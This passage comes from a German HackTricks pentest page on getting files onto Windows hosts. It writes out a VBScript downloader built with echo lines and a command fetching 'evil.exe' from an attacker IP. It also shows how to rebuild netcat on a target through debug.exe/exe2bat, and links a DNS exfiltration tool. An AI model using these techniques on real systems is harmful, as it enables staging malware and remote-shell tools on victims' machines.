echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Das Programm `debug.exe` ermöglicht nicht nur die Inspektion von Binärdateien, sondern kann sie auch aus Hexadezimalwerten **rekonstruieren**. Das bedeutet, dass `debug.exe` anhand einer Hexadezimaldarstellung eine Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung hat und Dateien nur bis zu einer Größe von 64 KB zusammenstellen kann**.
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
Dann kopieren Sie den Text in die Windows-Shell und eine Datei namens nc.exe wird erstellt.

* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Schwachstellen, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
